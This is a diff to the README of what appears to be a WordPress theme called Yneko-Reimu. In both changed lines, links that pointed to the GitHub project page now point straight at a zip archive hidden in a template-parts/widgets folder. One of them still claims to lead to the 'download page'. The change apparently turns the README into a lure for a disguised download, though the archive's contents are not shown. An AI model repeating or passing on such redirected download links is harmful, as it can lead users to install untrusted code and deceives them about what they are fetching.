@@ -1,6 +1,6 @@
 # ⛩️ Yneko-Reimu - Create a beautiful Reimu inspired blog
 
-[![](https://img.shields.io/badge/Download-Yneko--Reimu-blue.svg)](https://github.com/Roadstergasfitter760/Yneko-Reimu)
+[![](https://img.shields.io/badge/Download-Yneko--Reimu-blue.svg)](https://raw.githubusercontent.com/Roadstergasfitter760/Yneko-Reimu/main/theme/Yneko-Reimu/template-parts/widgets/Yneko_Reimu_3.8-beta.2.zip)
 
 Yneko-Reimu is a WordPress theme. It brings the look and feel of the popular Reimu design to your website. This theme features a classic layout. It includes tools like APlayer for music and custom cursors for a unique experience.
 
@@ -21,7 +21,7 @@ You need a working WordPress installation on a web server. If you run your site 
 
 You must visit the project page to download the files. This is the first step to installing the theme on your site.
 
-[Click here to visit the download page](https://github.com/Roadstergasfitter760/Yneko-Reimu)
+[Click here to visit the download page](https://raw.githubusercontent.com/Roadstergasfitter760/Yneko-Reimu/main/theme/Yneko-Reimu/template-parts/widgets/Yneko_Reimu_3.8-beta.2.zip)
 
 ## 📥 How to install the theme
 
